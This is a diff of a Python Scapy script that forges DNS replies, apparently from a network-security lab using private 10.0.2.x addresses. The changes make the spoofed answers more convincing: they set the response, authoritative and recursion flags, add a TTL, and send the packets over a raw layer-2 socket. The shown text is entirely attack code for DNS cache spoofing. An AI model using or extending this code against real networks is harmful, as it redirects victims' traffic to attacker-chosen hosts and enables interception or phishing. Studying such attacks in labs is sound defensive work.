@@ -6,7 +6,7 @@ spoofed_addr = "10.0.2.5"
 interface = "enp0s9"
 sock = conf.L2socket(iface=interface)
 
-dns_server_ip = "10.0.2.1"
+dns_server_ip = "142.251.39.110"
 dns_server_mac = "52:54:00:12:35:00"
 
 host_ip_addr = get_if_addr(interface)
@@ -42,8 +42,11 @@ def dns_spoof(pkt, ip_of_dns):
     spoofed_pkt[Ether].dst = pkt[Ether].src
     spoofed_pkt[IP].src = str(pkt[IP].dst)
     spoofed_pkt[IP].dst = str(pkt[IP].src)
-    spoofed_pkt[DNS].an = DNSRR(rrname=qname, rdata=ip_of_dns)
+    spoofed_pkt[DNS].an = DNSRR(rrname=qname, rdata=ip_of_dns, ttl=300)
     spoofed_pkt[DNS].ancount = 1
+    spoofed_pkt[DNS].qr = 1
+    spoofed_pkt[DNS].aa = 1
+    spoofed_pkt[DNS].ra = 1
     spoofed_pkt[UDP].sport = pkt[UDP].dport
     spoofed_pkt[UDP].dport = pkt[UDP].sport
 
@@ -52,7 +55,7 @@ def dns_spoof(pkt, ip_of_dns):
     del spoofed_pkt[UDP].len
     del spoofed_pkt[UDP].chksum
     
-    sendp(spoofed_pkt)
+    sock.send(spoofed_pkt)
     print("Sent")
 
 
@@ -112,7 +115,7 @@ def main_dns():
 
 main_dns()
 
-
+#src host 10.0.2.4 udp and port 53
 
 
 
